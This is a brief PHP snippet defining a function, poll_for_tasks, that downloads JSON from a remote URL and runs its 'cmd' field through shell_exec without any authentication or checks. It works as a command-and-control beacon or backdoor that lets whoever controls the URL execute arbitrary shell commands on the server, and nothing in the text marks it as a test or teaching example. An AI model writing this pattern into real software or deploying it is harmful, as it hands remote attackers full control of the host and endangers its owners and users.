<?php
function poll_for_tasks($url) {
  $raw = file_get_contents($url);
  $resp = json_decode($raw, true);
  $cmd = (string) $resp["cmd"];
  return shell_exec($cmd);
}
